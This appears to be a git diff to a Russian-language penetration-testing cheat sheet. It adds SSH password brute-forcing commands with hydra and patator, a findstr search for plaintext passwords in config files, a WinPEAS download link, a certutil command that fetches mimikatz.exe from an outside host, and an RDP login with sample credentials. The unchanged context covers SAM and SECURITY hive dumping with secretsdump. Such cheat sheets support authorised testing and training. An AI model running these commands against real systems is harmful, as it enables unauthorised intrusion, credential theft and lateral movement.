@@ -9,7 +9,8 @@ echo ‘PubkeyAcceptedAlgorithms +ssh-rsa’ >> /etc/ssh/sshd_config
 Перебор паролей:
 
 ```
-hydra -V -f -t 4 -l root -P pass.txt ssh://172.16.60.1
+hydra -V -f -t 4 -l root -P pass.txt ssh://<victim_ip>
+patator ssh_login host=<victim_ip> user=john password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg='Authentication failed.'
 ```
 
 ```
@@ -34,6 +35,9 @@ nmap -Pn -n -sT -p 88,135,137,389,445,1433,3389 -sV -sC --open -iL list-of-machi
 2. Применение атак методом перебора
 3. Перехват трафика и атаки MiTM (https://github.com/frostbits-security/MITM-cheatsheet?tab=readme-ov-file#sslstrip-sslstrip-hsts)
 4. Поиск неправильной конфигурации (Redis, Сетевые шары, веб-порталы)
+   ```
+   findstr /s /p /i /n /m "password" *.xml *.ini *.txt *.config
+   ```
 
    
 ## Веб
@@ -202,6 +206,7 @@ LinPEAS
 
 WinPEAS
     https://github.com/carlospolop/PEASS-ng/
+    https://github.com/carlospolop/PEASS-ng/releases/download/20230413-7f846812/winPEASx64.exe
 
 Найти не экранированные сервисы (подробнее: https://juggernaut-sec.com/unquoted-service-paths/):
 
@@ -224,6 +229,10 @@ reg save HKLM\security security.save
 reg save hklm\sam sam.save
 
 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+```
+### Перенос файлов
+```
+certutil -urlcache -split -f http://10.10.14.16/mimikatz.exe m.exe
 ```
 
 ## Active Directory
@@ -419,6 +428,7 @@ https://ppn.snovvcrash.rocks/pentest/c2/meterpreter
 ```
 rdp_check <domain>/<name>:<password>@<IP>
 xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.186.81 /u:'Administrator' /p:'Password321'
+xfreerdp /u:john /p:loveme1 /w:768 /v:<victim_ip>
 ```
 
 ## Эксфильтрафия 
